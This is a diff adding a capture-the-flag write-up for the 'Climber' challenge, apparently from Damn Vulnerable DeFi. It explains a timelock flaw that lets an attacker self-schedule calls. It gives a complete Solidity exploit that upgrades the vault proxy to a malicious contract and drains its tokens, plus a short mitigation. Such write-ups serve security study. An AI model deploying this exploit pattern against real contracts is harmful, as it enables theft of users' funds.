@@ -888,3 +888,112 @@ Tests `backdoor.challenge.js`
 
 ### Mitigation 
 We should treat externally created wallets with great caution because we never know what code was executed during their creation. To mitigate this we should accept wallets only from whitelisted users, or check and revert inside `proxyCreated` if initializer contains `to` address that is not zero.
+
+## Challenge #12 - Climber
+There’s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the UUPS pattern.
+
+The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.
+
+On the vault there’s an additional role with powers to sweep all tokens in case of an emergency.
+
+On the timelock, only an account with a “Proposer” role can schedule actions that can be executed 1 hour later.
+
+To pass this challenge, take all tokens from the vault.
+
+### `ClimberTimelock.sol`: self call with `execute` function and `ADMIN` rights
+
+`execute` function call allows to pass the timelock contract address inside `targets` array with the custom calldata. As a result we can call guarded functions like `updateDelay`, `grantRole` and `upgradeTo`.
+
+### Proof of concept
+
+Attack scenario:
+- deploy BadVault contract which we'll use during proxy upgrade
+- prepare `execute` calldata
+- call `execute` as a timelock contract in which we 
+1. call `updateDelay` and set it to 0, so our proposal would be executed in the same block
+2. grant proposer role to our exploit contract
+3. upgrade vault proxy to BadVault
+4. call our callback where we call schedule function so our proposal could get through status checks
+- drain funds from the vault with our new permissionless `sweepFunds` function  
+
+```
+// SPDX-License-Identifier: MIT
+
+import "../climber/ClimberVault.sol";
+import "../climber/ClimberTimelock.sol";
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
+
+pragma solidity ^0.8.0;
+
+contract BadVault is ClimberVault{
+    function sweepFunds(address token, address to) external {
+        SafeTransferLib.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));
+    }
+}
+
+contract ClimberExploit {
+    ClimberVault public immutable vault;
+    ClimberTimelock public immutable timelock;
+    IERC20 public immutable DVT;
+    bytes32 private salt = "0xabadbabe";
+    
+    bytes[] private payload;
+    address[] private targets_;
+    uint256[] private values_;
+
+    constructor (ClimberVault _vault, ClimberTimelock _timelock, IERC20 _DVT) {
+        vault = _vault;
+        timelock = _timelock;
+        DVT = _DVT;
+    }
+
+    function attack() external {
+        BadVault fake = new BadVault();
+
+        address[] memory targets = new address[](4);
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory data = new bytes[](4);
+
+        targets[0] = address(timelock);
+        targets[1] = address(timelock);
+        targets[2] = address(vault);
+        targets[3] = address(this);
+
+        values[0] = 0;
+        values[1] = 0;
+        values[2] = 0;
+        values[3] = 0;
+
+        data[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
+        data[1] = abi.encodeWithSignature("grantRole(bytes32,address)", bytes32(PROPOSER_ROLE), address(this));
+        data[2] = abi.encodeWithSignature("upgradeTo(address)", fake);
+        data[3] = abi.encodeWithSignature("callback()");
+
+        payload = data;
+        targets_ = targets;
+        values_ = values;
+
+        timelock.execute(targets, values, data, salt);
+        BadVault(address(vault)).sweepFunds(address(DVT), msg.sender);
+    }
+
+    function callback() external {
+        timelock.schedule(targets_, values_, payload, salt);
+    }
+}
+```
+
+Tests `climber.challenge.js`
+
+```
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        const Exploit = await ethers.getContractFactory('ClimberExploit');
+        exploit = await Exploit.deploy(vault.address, timelock.address, token.address);
+        await exploit.connect(player).attack();
+    });
+```
+
+### Mitigation
+
+The reason this attack was possible is that we check the scheduled proposal status after the `functionCall`, therefore we must conduct all the checks first.
